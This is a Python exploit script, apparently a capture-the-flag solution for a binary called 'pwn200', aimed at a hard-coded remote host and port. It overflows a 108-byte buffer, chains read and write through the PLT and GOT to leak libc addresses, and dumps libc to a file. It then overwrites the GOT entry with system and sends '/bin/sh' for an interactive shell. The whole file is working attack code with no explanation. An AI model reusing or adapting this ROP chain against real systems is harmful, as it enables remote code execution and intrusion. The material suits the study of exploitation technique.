from zio import *

target = "./pwn200"
target = ("133.130.111.139", 2333)

def get_io(target, read_set = COLORED(RAW, "green"), write_set = COLORED(RAW, "blue")):
	io = zio(target, timeout = 9999, print_read = read_set, print_write = write_set)
	return io

def check_libc(io, offset_t):
	io.read_until("\n")

	read_plt = l32(0x08048390)
	write_plt = l32(0x080483c0)
	read_got = 0x0804a004
	write_got = 0x0804a010
	p_ret = l32(0x08048453)
	pp_ret = l32(0x08048452)
	ppp_ret = l32(0x0804856c)
	data_addr = 0x0804A014

	call_addr = l32(0x0804855F)

	#size_t = 2000000
	size_t = 1000

	ebp = l32(0x01010101)
	pre_padding = 'a' * 108 + ebp
	shellcode = write_plt + ppp_ret + l32(1) + l32(read_got) + l32 (4)
	shellcode += read_plt + ppp_ret + l32(0) + l32(data_addr) + l32(5)
	shellcode += call_addr
	payload = pre_padding + shellcode
	io.write(payload + "\n")
	data = io.read(4)
	read_addr = l32(data)
	print "read_addr:", hex(read_addr)
	libc_addr = read_addr - offset_t
	print "libc_addr:", hex(libc_addr)
	shellcode = write_plt + ppp_ret + l32(1) + l32(libc_addr) + l32 (size_t)
	pre_padding = 'a' * (108 + 5) + ebp
	payload = pre_padding + shellcode
	io.write(payload + "\n")

	data = io.read(size_t)
	io.close()

	print "read_len:", len(data)
	if len(data) == 0:
		return False
	else:
		return True

def get_libc(io, offset_t):
	io.read_until("\n")

	read_plt = l32(0x08048390)
	write_plt = l32(0x080483c0)
	read_got = 0x0804a004
	write_got = 0x0804a010
	p_ret = l32(0x08048453)
	pp_ret = l32(0x08048452)
	ppp_ret = l32(0x0804856c)
	data_addr = 0x0804A014

	call_addr = l32(0x0804855F)

	size_t = 20000000

	ebp = l32(0x01010101)
	pre_padding = 'a' * 108 + ebp
	shellcode = write_plt + ppp_ret + l32(1) + l32(read_got) + l32 (4)
	shellcode += read_plt + ppp_ret + l32(0) + l32(data_addr) + l32(5)
	shellcode += call_addr
	payload = pre_padding + shellcode
	io.gdb_hint()
	io.write(payload + "\n")
	data = io.read(4)
	read_addr = l32(data)
	print "read_addr:", hex(read_addr)
	libc_addr = read_addr - offset_t
	print "libc_addr:", hex(libc_addr)
	shellcode = write_plt + ppp_ret + l32(1) + l32(libc_addr) + l32 (size_t)
	pre_padding = 'a' * (108 + 5) + ebp
	payload = pre_padding + shellcode
	io.write(payload + "\n")

	data = io.read(size_t)
	print len(data)
	file_w = open("libc.so", 'w')
	file_w.write(data)
	file_w.close()

def pwn(io):
	io.read_until("\n")

	read_plt = l32(0x08048390)
	write_plt = l32(0x080483c0)
	read_got = 0x0804a004
	write_got = 0x0804a010
	p_ret = l32(0x08048453)
	pp_ret = l32(0x08048452)
	ppp_ret = l32(0x0804856c)
	data_addr = 0x0804A014

	ebp = l32(0x01010101)
	pre_padding = 'a' * 108 + ebp
	shellcode = write_plt + ppp_ret + l32(1) + l32(read_got) + l32 (4)
	shellcode += read_plt + ppp_ret + l32(0) + l32(data_addr) + l32(9)
	shellcode += read_plt + ppp_ret + l32(0) + l32(read_got) + l32(4)
	shellcode += read_plt + p_ret + l32(data_addr)
	payload = pre_padding + shellcode
	io.gdb_hint()
	io.write(payload + "\n")
	data = io.read(4)
	print [c for c  in data]
	read_addr = l32(data)
	print "read_addr:", hex(read_addr)

	#local
	libc_addr = read_addr - 0x000D95E0
	system_addr = libc_addr + 0x0003E360
	print "system_addr:", hex(system_addr)

	io.write("/bin/sh;\n")
	io.write(l32(system_addr) + "\n")

	io.interact()

"""
start = 0
end = 2000000
offset_t = 0
while True:
	io = get_io(target, False, False)
	offset_t = (start + end) / 2
	if check_libc(io, offset_t) == False:
		end = offset_t
	else:
		start = offset_t
	print "start, end:", hex(start), hex(end)
	if start == end:
		offset_t = start
		break

raw_input(":")
"""
"""
io = get_io(target)
offset_t = 0xda5e0
get_libc(io, offset_t = offset_t)

"""
io = get_io(target)
pwn(io)
#"""